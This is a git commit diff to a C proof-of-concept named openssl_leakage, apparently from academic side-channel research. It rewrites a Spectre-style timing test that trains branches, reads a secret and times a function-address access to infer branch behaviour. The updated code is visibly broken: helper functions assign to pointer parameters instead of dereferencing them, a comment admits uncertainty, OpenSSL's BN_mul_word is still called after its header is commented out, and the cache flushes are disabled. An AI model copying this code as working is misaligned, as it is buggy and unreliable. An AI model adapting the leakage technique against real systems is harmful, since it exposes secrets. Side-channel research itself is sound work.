b1c21b08c6d1582ba4494b49a4a58e9f923f93e0
mbhuUM <mbhu@umich.edu>
2024-04-14 18:51:28 -0400

    updated openssl_leakage for smother

--- PoC/openssl_leakage/main.c
+++ PoC/openssl_leakage/main.c
@@ -2,18 +2,32 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <string.h>
-#include <x86intrin.h>
+#include "config.h"
+#include "spectre.h"
+#include "timing.h"
+// #include <x86intrin.h>
 
-#include <openssl/bn.h>
+// #include <openssl/bn.h>
 
-#define clflush(a) asm volatile ("clflush 0(%0)": : "r" (&a):);
-#define access(a) asm volatile ("mov (%0), %%eax" :: "r"((void*)a));
-#define memory_barrier asm volatile ("mfence;\nsfence;\nlfence;\n");
-BIGNUM* a __attribute__((aligned(4096)));
-BIGNUM* b __attribute__((aligned(4096)));
-BN_ULONG secret __attribute__((aligned(4096))) = 0;
-BIGNUM* ptr __attribute__((aligned(4096)));
+// #define clflush(a) asm volatile ("clflush 0(%0)": : "r" (&a):);
+// #define access(a) asm volatile ("mov (%0), %%eax" :: "r"((void*)a));
+// #define memory_fence(); asm volatile ("mfence;\nsfence;\nlfence;\n");
+long* a __attribute__((aligned(4096)));
+long* b __attribute__((aligned(4096)));
+long secret __attribute__((aligned(4096))) = 0;
+long* ptr __attribute__((aligned(4096)));
 
+void mult(long * val, unsigned int w)
+{
+  val = *val * w;
+  return;
+
+}
+
+void setVal(long * val, unsigned int w)
+{
+  val = w;
+}
 int main(int argc, char *argv[])
 {
   if ((atoi(argv[1])%2) == 0)
@@ -21,37 +35,48 @@ int main(int argc, char *argv[])
   else
     secret = 1;
   ptr = b;
-  memory_barrier
+  memory_fence();
 
   unsigned int dummy;
-  a = BN_new();
-  b = BN_new();
+  a = malloc(32);
+  b = malloc(32);
 
-  BN_set_word(a, 1);
-  BN_set_word(b, 0);
-  memory_barrier
+  // BN_set_word(a, 1);
+  setVal(a, 1); //idr if this is right
+  // BN_set_word(b, 0);
+  setVal(b, 0);
+  memory_fence();
 
   // Train branch1 true, branch2 false 
-  BN_mul_word(a, 1);
-  BN_set_word(a, 1);
-  BN_mul_word(a, 1);
+  // BN_mul_word(a, 1);
+  mult(a, 1);
+  // BN_set_word(a, 1);
+  setVal(a, 1);
+  // BN_mul_word(a, 1);
+  mult(a, 1);
 
-  memory_barrier
-  clflush(BN_set_word);
-  clflush(b);
-  clflush(ptr);
-  *(volatile BN_ULONG*)&secret;
-  memory_barrier
+  memory_fence();
   
+  // clflush(setVal);
+  // clflush(b);
+  // clflush(ptr);
+  *(volatile long*)&secret;
+  memory_fence();
+
   //Branch1 should be false
   BN_mul_word(b, secret);
-  memory_barrier
+  memory_fence();
 
-  uint64_t time = __rdtscp(&dummy);
-  *(volatile uint64_t*)&BN_set_word;
-  time = __rdtscp(&dummy) - time;
-  memory_barrier
-  printf("Time: %ld\n", time) ;
+  // uint64_t time = __rdtscp(&dummy);
+  timer_start();
+  // *(volatile uint64_t*)&BN_set_word;
+  *(volatile uint64_t*)&setVal;
+  // time = __rdtscp(&dummy) - time;
+  timer_end();
+  memory_fence();
+  // printf("Time: %ld\n", time) ;
 
-  BN_free(a);
+  free(a);
+  // //avoid mem leak?
+  // free(b);
 }
